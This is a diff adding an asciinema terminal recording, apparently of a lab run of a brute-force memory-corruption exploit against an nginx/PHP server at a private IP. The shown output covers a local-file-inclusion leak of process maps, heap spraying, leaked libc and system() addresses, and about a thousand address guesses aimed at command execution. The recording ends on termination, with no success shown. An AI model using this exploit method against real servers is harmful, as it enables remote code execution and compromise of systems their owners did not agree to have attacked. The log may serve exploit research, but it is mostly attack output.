@@ -1,0 +1,13 @@
+{"version":3,"term":{"cols":80,"rows":24},"timestamp":1779313611,"command":"python3 tools/maps_only_bruteforce_exploit.py --target 192.168.1.205:19321 --cmd id --max-candidates 6000 --progress-every 250 --proof-delay 0.05 --recovery-timeout 20 --time-budget 7200","title":"maps-only Vagrant dense-sled campaign ptrace_scope=1","env":{"SHELL":"/opt/homebrew/bin/fish"}}
+[0.044, "o", "target        192.168.1.205:19321\r\nprimitive     LFI maps/libc + marker proof; no /proc/<pid>/mem; no core parsing\r\nptrace rule   target OS ptrace policy is not changed by this tool\r\ncommand       id\r\n\r\n"]
+[0.029, "o", "[*] profiling heap growth with 20 delayed /spray bodies\r\n"]
+[0.637, "o", "php uid       65534\r\nmaster pid    3044\r\nworker pid    27135\r\nnginx rw      0x55e420b83000\r\nlibc base     0x7fca47a6d000\r\nsystem        0x7fca47abdd70 (offset 0x50d70)\r\n"]
+[0.000, "o", "candidate ranges\r\n  0x55e421058000-0x55e4210db000 0x83000 [heap]\r\n  0x55e420ff3000-0x55e421058000 0x65000 [heap]\r\n\r\n"]
+[0.001, "o", "cleanup sled  shared-command stride=32 phase=0 slots=122 command_offset=3923\r\n"]
+[0.031, "o", "[*] address_mod=7 scanned=514168 safe_seen=6000 selected=6000\r\n"]
+[0.000, "o", "    try=1 mod=7 addr=0x55e421062127 low=2721 rate=31.41/s\r\n"]
+[314.586, "o", "    try=250 mod=7 addr=0x55e421064277 low=7742 rate=0.79/s\r\n"]
+[315.753, "o", "    try=500 mod=7 addr=0x55e421065b77 low=775b rate=0.79/s\r\n"]
+[315.916, "o", "    try=750 mod=7 addr=0x55e421067777 low=7777 rate=0.79/s\r\n"]
+[316.189, "o", "    try=1000 mod=7 addr=0x55e421073a77 low=773a rate=0.79/s\r\n"]
+[72.836, "x", "143"]
